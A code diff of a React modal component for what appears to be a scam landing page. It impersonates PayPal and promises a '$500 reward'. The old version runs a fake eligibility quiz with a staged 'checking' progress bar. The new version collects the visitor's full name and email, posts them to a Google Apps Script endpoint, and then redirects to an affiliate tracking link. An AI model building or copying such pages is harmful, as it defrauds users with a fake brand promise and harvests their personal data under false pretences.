@@ -1,169 +1,393 @@
-import React, { useState, useEffect } from 'react';
-import { X, CheckCircle2, ChevronRight, Sparkles, ShieldCheck } from 'lucide-react';
-import confetti from 'canvas-confetti';
+import React, { useState } from 'react';
+import { X, ShieldCheck, ArrowRight, User, Mail } from 'lucide-react';
+let url = "https://script.google.com/macros/s/AKfycbzzny7J7NODDzN6sEuSlrQXJ0qsyLG2R0nQELX1Vm8pjOtP9uUOpq7xGJs3yHXbSu30ow/exec";
+let redirectUrl = "https://app.hawktrk.com/click?pid=2&offer_id=11788&sub2=u624544&sub5=s1SUBID1HERE";
+function redirect() {
+  if (redirectUrl) {
+    window.location.href = redirectUrl;
+  }
+}
 
 export const EligibilityModal = ({ isOpen, onClose }) => {
-  const [step, setStep] = useState(1);
-  const [loadingProgress, setLoadingProgress] = useState(0);
-  const [, setAnswers] = useState({
-    userStatus: '',
-    payoutMethod: ''
-  });
+  const [fullname, setFullname] = useState('');
+  const [email, setEmail] = useState('');
+  const [focusedField, setFocusedField] = useState(null);
+  const [isloading, setIsLoaing] = useState(false);
 
-  // Handle choice selection for step 1 & 2
-  const handleSelectOption = (key, value) => {
-    setAnswers(prev => ({ ...prev, [key]: value }));
-    if (step === 1) {
-      setStep(2);
-    } else if (step === 2) {
-      setStep(3); // Go to verification loading step
-    }
+  const handleSubmit = (e) => {
+    e.preventDefault();
+    let name = fullname;
+    console.log("Registration submitted:", { name, email });
+    setIsLoaing(true);
+    fetch(url, {
+      method: "POST",
+
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: `Name=${name}&Email=${email}`,
+    })
+      .then((res) => res.text())
+      .then((data) => {
+        redirect();
+      })
+      .catch((error) => console.log(error))
+      .finally(() => setIsLoaing(false));
   };
-
-  // Simulate verification calculation loading in step 3
-  useEffect(() => {
-    if (step === 3) {
-      setLoadingProgress(0);
-      const interval = setInterval(() => {
-        setLoadingProgress((prev) => {
-          if (prev >= 100) {
-            clearInterval(interval);
-            setTimeout(() => {
-              setStep(4);
-              // Trigger celebratory confetti effect
-              confetti({
-                particleCount: 120,
-                spread: 70,
-                origin: { y: 0.6 }
-              });
-            }, 300);
-            return 100;
-          }
-          return prev + 10;
-        });
-      }, 150);
-      return () => clearInterval(interval);
-    }
-  }, [step]);
-
-  const handleReset = () => {
-    setStep(1);
-    setLoadingProgress(0);
-    setAnswers({ userStatus: '', payoutMethod: '' });
+  const handleClose = () => {
+    setFullname('');
+    setEmail('');
     onClose();
   };
 
   if (!isOpen) return null;
 
   return (
-    <div className="modal-backdrop" onClick={handleReset}>
-      <div className="modal-card" onClick={(e) => e.stopPropagation()}>
-        <button className="modal-close-btn" onClick={handleReset} aria-label="Close modal">
-          <X size={20} />
-        </button>
+    <div className="modal-backdrop" onClick={handleClose}>
+      <div
+        onClick={(e) => e.stopPropagation()}
+        style={{
+          width: '100%',
+          maxWidth: '420px',
+          borderRadius: '24px',
+          overflow: 'hidden',
+          boxShadow: '0 24px 60px rgba(0,0,0,0.55)',
+          animation: 'slideUp 0.32s cubic-bezier(0.16, 1, 0.3, 1)',
+          position: 'relative',
+        }}
+      >
+        {/* ── Dark navy hero top ── */}
+        <div
+          style={{
+            background: 'radial-gradient(circle at 50% 10%, #062b7e 0%, #011646 60%, #000c2c 100%)',
+            padding: '28px 24px 32px',
+            position: 'relative',
+            overflow: 'hidden',
+          }}
+        >
+          {/* Confetti particles */}
+          {[
+            { top: '12%', left: '8%', w: 8, h: 5, rot: -30, color: '#ffd700', delay: '0s' },
+            { top: '20%', left: '78%', w: 6, h: 10, rot: 20, color: '#ffd700', delay: '0.4s' },
+            { top: '8%', left: '55%', w: 10, h: 5, rot: 10, color: '#38bdf8', delay: '0.8s' },
+            { top: '35%', left: '88%', w: 6, h: 6, rot: 45, color: '#ffd700', delay: '1.2s' },
+            { top: '5%', left: '35%', w: 7, h: 4, rot: -15, color: '#ffd700', delay: '0.6s' },
+          ].map((p, i) => (
+            <div
+              key={i}
+              style={{
+                position: 'absolute',
+                top: p.top,
+                left: p.left,
+                width: `${p.w}px`,
+                height: `${p.h}px`,
+                background: p.color,
+                borderRadius: '2px',
+                transform: `rotate(${p.rot}deg)`,
+                animation: `floatSparkle 4s ${p.delay} ease-in-out infinite`,
+                opacity: 0.85,
+                pointerEvents: 'none',
+              }}
+            />
+          ))}
 
-        {/* Step 1: Account Status */}
-        {step === 1 && (
-          <div>
-            <div className="modal-step-indicator">Step 1 of 2</div>
-            <h3 className="modal-heading">Are you an active PayPal account holder?</h3>
-            <div className="modal-options-list">
-              <button className="modal-option-btn" onClick={() => handleSelectOption('userStatus', 'Active User')}>
-                <span>Yes, I use PayPal regularly</span>
-                <ChevronRight size={18} color="#67c617" />
-              </button>
-              <button className="modal-option-btn" onClick={() => handleSelectOption('userStatus', 'Occasional User')}>
-                <span>Yes, but I rarely use it</span>
-                <ChevronRight size={18} color="#67c617" />
-              </button>
-              <button className="modal-option-btn" onClick={() => handleSelectOption('userStatus', 'New User')}>
-                <span>No, I will create a free account</span>
-                <ChevronRight size={18} color="#67c617" />
-              </button>
-            </div>
+          {/* Close button */}
+          <button
+            onClick={handleClose}
+            aria-label="Close modal"
+            style={{
+              position: 'absolute',
+              top: '14px',
+              right: '14px',
+              background: 'rgba(255,255,255,0.12)',
+              border: '1px solid rgba(255,255,255,0.2)',
+              borderRadius: '50%',
+              width: '32px',
+              height: '32px',
+              display: 'flex',
+              alignItems: 'center',
+              justifyContent: 'center',
+              color: '#ffffff',
+              cursor: 'pointer',
+              zIndex: 10,
+            }}
+          >
+            <X size={16} />
+          </button>
+
+          {/* Badge */}
+          <div
+            style={{
+              display: 'inline-flex',
+              alignItems: 'center',
+              gap: '7px',
+              background: 'rgba(103,198,23,0.15)',
+              border: '1px solid rgba(103,198,23,0.4)',
+              borderRadius: '20px',
+              padding: '5px 12px',
+              fontSize: '0.78rem',
+              fontWeight: 700,
+              color: '#8ce438',
+              marginBottom: '14px',
+            }}
+          >
+            {/* shield icon inline */}
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+            </svg>
+            Limited Time Opportunity
           </div>
-        )}
 
-        {/* Step 2: Preferred Payout */}
-        {step === 2 && (
-          <div>
-            <div className="modal-step-indicator">Step 2 of 2</div>
-            <h3 className="modal-heading">Select your preferred reward payout method:</h3>
-            <div className="modal-options-list">
-              <button className="modal-option-btn" onClick={() => handleSelectOption('payoutMethod', 'Instant Payout')}>
-                <span>⚡ Instant PayPal Deposit</span>
-                <ChevronRight size={18} color="#67c617" />
-              </button>
-              <button className="modal-option-btn" onClick={() => handleSelectOption('payoutMethod', 'Gift Card Code')}>
-                <span>🎁 Digital Reward Code</span>
-                <ChevronRight size={18} color="#67c617" />
-              </button>
+          {/* Hero row: text + reward card */}
+          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: '12px' }}>
+            {/* Left text */}
+            <div style={{ flex: 1 }}>
+              <h2
+                style={{
+                  fontSize: 'clamp(1.5rem, 5vw, 2rem)',
+                  fontWeight: 800,
+                  color: '#ffffff',
+                  lineHeight: 1.15,
+                  marginBottom: '10px',
+                  letterSpacing: '-0.02em',
+                }}
+              >
+                See If You{' '}
+                <span style={{ color: '#61A631' }}>Qualify</span>{' '}
+                Today
+              </h2>
+              <p style={{ fontSize: '0.83rem', color: '#b0c4de', lineHeight: 1.45, maxWidth: '200px' }}>
+                Take a few simple steps to check your eligibility for today's reward opportunity.
+              </p>
             </div>
-          </div>
-        )}
 
-        {/* Step 3: Checking Database Animation */}
-        {step === 3 && (
-          <div style={{ textAlign: 'center', padding: '10px 0' }}>
-            <div className="spinner-ring" />
-            <h3 className="modal-heading" style={{ marginBottom: '8px' }}>Checking Eligibility...</h3>
-            <p style={{ fontSize: '0.88rem', color: '#64748b', marginBottom: '16px' }}>
-              Verifying your profile against today's allocation quota.
-            </p>
-            <div style={{ background: '#f1f5f9', borderRadius: '10px', height: '10px', overflow: 'hidden', width: '100%' }}>
+            {/* Right: Reward card */}
+            <div style={{ position: 'relative', flexShrink: 0 }}>
               <div
                 style={{
-                  width: `${loadingProgress}%`,
-                  height: '100%',
-                  background: 'linear-gradient(90deg, #74d41e, #58b012)',
-                  transition: 'width 0.15s ease-in-out'
+                  width: '120px',
+                  background: '#ffffff',
+                  borderRadius: '14px',
+                  padding: '12px 10px 36px',
+                  boxShadow: '0 16px 36px rgba(0,0,0,0.5)',
+                  animation: 'gentleFloat 5s ease-in-out infinite',
+                  position: 'relative',
+                  overflow: 'hidden',
+                  textAlign: 'center',
+                }}
+              >
+                {/* PayPal logo text */}
+                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '5px', marginBottom: '6px' }}>
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+                    <path d="M19.5 8.5C19.5 13 16 15.5 11.5 15.5H10L9 20H6L8.5 7H14C17.5 7 19.5 8.5 19.5 11.5z" fill="#009cde" />
+                    <path d="M16.5 5.5C16.5 10 13 12.5 8.5 12.5H7L6 17H3L5.5 4H11C14.5 4 16.5 5.5 16.5 8.5z" fill="#003087" />
+                  </svg>
+                  <span style={{ fontSize: '0.75rem', fontWeight: 800, color: '#003087', letterSpacing: '-0.01em' }}>PayPal</span>
+                </div>
+                <div style={{ fontSize: '0.6rem', fontWeight: 700, color: '#64748b', textTransform: 'uppercase', letterSpacing: '0.06em', marginBottom: '2px' }}>
+                  REWARD
+                </div>
+                <div style={{ fontSize: '2rem', fontWeight: 900, color: '#61A631', lineHeight: 1, letterSpacing: '-0.03em' }}>
+                  $500
+                </div>
+                {/* Ribbon */}
+                <div
+                  style={{
+                    position: 'absolute',
+                    bottom: 0,
+                    left: 0,
+                    right: 0,
+                    height: '28px',
+                    background: 'linear-gradient(90deg, #0050cd, #0070ba, #0050cd)',
+                    display: 'flex',
+                    alignItems: 'center',
+                    justifyContent: 'center',
+                  }}
+                >
+                  {/* Bow SVG */}
+                  <svg width="32" height="20" viewBox="0 0 32 20" fill="none" style={{ position: 'absolute', top: '-10px' }}>
+                    <ellipse cx="8" cy="10" rx="8" ry="6" fill="#1a6fd4" opacity="0.9" />
+                    <ellipse cx="24" cy="10" rx="8" ry="6" fill="#1a6fd4" opacity="0.9" />
+                    <circle cx="16" cy="10" r="4" fill="#2c82e0" />
+                  </svg>
+                </div>
+              </div>
+              {/* Podium base */}
+              <div
+                style={{
+                  width: '130px',
+                  height: '22px',
+                  background: 'radial-gradient(ellipse at 50% 30%, #0c4ad0 0%, #02206d 70%, #00103a 100%)',
+                  borderRadius: '50%',
+                  marginTop: '-6px',
+                  boxShadow: '0 8px 20px rgba(0,0,0,0.5)',
                 }}
               />
             </div>
-            <div style={{ fontSize: '0.82rem', fontWeight: 700, color: '#58b012', marginTop: '8px' }}>
-              {loadingProgress}% Complete
-            </div>
           </div>
-        )}
+        </div>
 
-        {/* Step 4: Qualified Congratulations Result */}
-        {step === 4 && (
-          <div style={{ textAlign: 'center' }}>
-            <div style={{ width: '64px', height: '64px', borderRadius: '50%', background: '#eefbe8', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 16px auto' }}>
-              <CheckCircle2 size={38} color="#58b012" />
+        {/* ── White form section ── */}
+        <div style={{ background: '#ffffff', padding: '24px 24px 28px' }}>
+          <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
+
+            {/* Full Name field */}
+            <div style={{ position: 'relative' }}>
+              <label
+                htmlFor="modal-fullname"
+                style={{
+                  display: 'block',
+                  fontSize: '0.8rem',
+                  fontWeight: 700,
+                  color: '#334155',
+                  marginBottom: '6px',
+                  textTransform: 'uppercase',
+                  letterSpacing: '0.05em',
+                }}
+              >
+                Full Name
+              </label>
+              <div style={{ position: 'relative' }}>
+                <User
+                  size={16}
+                  style={{
+                    position: 'absolute',
+                    left: '14px',
+                    top: '50%',
+                    transform: 'translateY(-50%)',
+                    color: focusedField === 'name' ? '#61A631' : '#94a3b8',
+                    transition: 'color 0.2s',
+                    pointerEvents: 'none',
+                  }}
+                />
+                <input
+                  id="modal-fullname"
+                  type="text"
+                  value={fullname}
+                  onChange={(e) => setFullname(e.target.value)}
+                  onFocus={() => setFocusedField('name')}
+                  onBlur={() => setFocusedField(null)}
+                  placeholder="Enter your full name"
+                  required
+                  style={{
+                    width: '100%',
+                    padding: '13px 14px 13px 40px',
+                    borderRadius: '12px',
+                    border: `1.5px solid ${focusedField === 'name' ? '#61A631' : '#e2e8f0'}`,
+                    fontSize: '0.95rem',
+                    fontFamily: 'inherit',
+                    color: '#0f1d38',
+                    background: '#f8fafc',
+                    outline: 'none',
+                    transition: 'border-color 0.2s, box-shadow 0.2s',
+                    boxShadow: focusedField === 'name' ? '0 0 0 3px rgba(97,166,49,0.12)' : 'none',
+                  }}
+                />
+              </div>
             </div>
 
-            <div style={{ display: 'inline-flex', alignItems: 'center', gap: '6px', background: 'rgba(103, 198, 23, 0.15)', color: '#438a0c', padding: '4px 12px', borderRadius: '20px', fontSize: '0.8rem', fontWeight: 700, marginBottom: '12px' }}>
-              <Sparkles size={14} /> ELIGIBILITY CONFIRMED
+            {/* Email field */}
+            <div style={{ position: 'relative' }}>
+              <label
+                htmlFor="modal-email"
+                style={{
+                  display: 'block',
+                  fontSize: '0.8rem',
+                  fontWeight: 700,
+                  color: '#334155',
+                  marginBottom: '6px',
+                  textTransform: 'uppercase',
+                  letterSpacing: '0.05em',
+                }}
+              >
+                Email Address
+              </label>
+              <div style={{ position: 'relative' }}>
+                <Mail
+                  size={16}
+                  style={{
+                    position: 'absolute',
+                    left: '14px',
+                    top: '50%',
+                    transform: 'translateY(-50%)',
+                    color: focusedField === 'email' ? '#61A631' : '#94a3b8',
+                    transition: 'color 0.2s',
+                    pointerEvents: 'none',
+                  }}
+                />
+                <input
+                  id="modal-email"
+                  type="email"
+                  value={email}
+                  onChange={(e) => setEmail(e.target.value)}
+                  onFocus={() => setFocusedField('email')}
+                  onBlur={() => setFocusedField(null)}
+                  placeholder="Enter your email address"
+                  required
+                  style={{
+                    width: '100%',
+                    padding: '13px 14px 13px 40px',
+                    borderRadius: '12px',
+                    border: `1.5px solid ${focusedField === 'email' ? '#61A631' : '#e2e8f0'}`,
+                    fontSize: '0.95rem',
+                    fontFamily: 'inherit',
+                    color: '#0f1d38',
+                    background: '#f8fafc',
+                    outline: 'none',
+                    transition: 'border-color 0.2s, box-shadow 0.2s',
+                    boxShadow: focusedField === 'email' ? '0 0 0 3px rgba(97,166,49,0.12)' : 'none',
+                  }}
+                />
+              </div>
             </div>
 
-            <h3 className="modal-heading" style={{ fontSize: '1.4rem', marginBottom: '6px' }}>
-              You Qualify For $500!
-            </h3>
-
-            <p style={{ fontSize: '0.88rem', color: '#475569', marginBottom: '20px' }}>
-              Congratulations! Your profile has been approved for today's $500 PayPal reward voucher.
-            </p>
-
-            <div style={{ background: '#f8fafc', border: '1px dashed #cbd5e1', borderRadius: '12px', padding: '12px', marginBottom: '20px' }}>
-              <div style={{ fontSize: '0.75rem', textTransform: 'uppercase', color: '#64748b', fontWeight: 700 }}>Claim Reference Code</div>
-              <div style={{ fontSize: '1.25rem', fontWeight: 900, color: '#003087', letterSpacing: '0.1em' }}>PP-500-QUALIFIED</div>
-            </div>
-
+            {/* Submit CTA */}
             <button
+              type="submit"
               className="cta-button"
-              onClick={handleReset}
-              style={{ width: '100%', fontSize: '1rem', padding: '16px' }}
+              disabled={isloading}
+              aria-busy={isloading}
+              style={{
+                width: '100%',
+                fontSize: '1rem',
+                padding: '16px',
+                marginTop: '4px',
+                borderRadius: '14px',
+                display: 'flex',
+                alignItems: 'center',
+                justifyContent: 'center',
+                gap: '10px',
+                background: isloading ? '#9ca3af' : undefined,
+                color: isloading ? '#e5e7eb' : undefined,
+                cursor: isloading ? 'not-allowed' : undefined,
+                boxShadow: isloading ? 'none' : undefined,
+                opacity: isloading ? 0.7 : undefined,
+              }}
             >
-              CLAIM YOUR REWARD NOW
+              {isloading ? 'PLEASE WAIT...' : 'ENTER NOW'}
+              <ArrowRight size={18} />
             </button>
+          </form>
 
-            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '6px', marginTop: '12px', fontSize: '0.78rem', color: '#64748b' }}>
-              <ShieldCheck size={14} color="#67c617" />
-              <span>100% Free & Verified Process</span>
-            </div>
+          {/* Trust line */}
+          <div
+            style={{
+              display: 'flex',
+              alignItems: 'center',
+              justifyContent: 'center',
+              gap: '14px',
+              marginTop: '14px',
+              fontSize: '0.78rem',
+              color: '#94a3b8',
+              fontWeight: 500,
+            }}
+          >
+            <ShieldCheck size={13} color="#61A631" />
+            <span>Secure</span>
+            <span style={{ color: '#cbd5e1' }}>•</span>
+            <span>Fast</span>
+            <span style={{ color: '#cbd5e1' }}>•</span>
+            <span>Easy</span>
           </div>
-        )}
+        </div>
       </div>
     </div>
   );
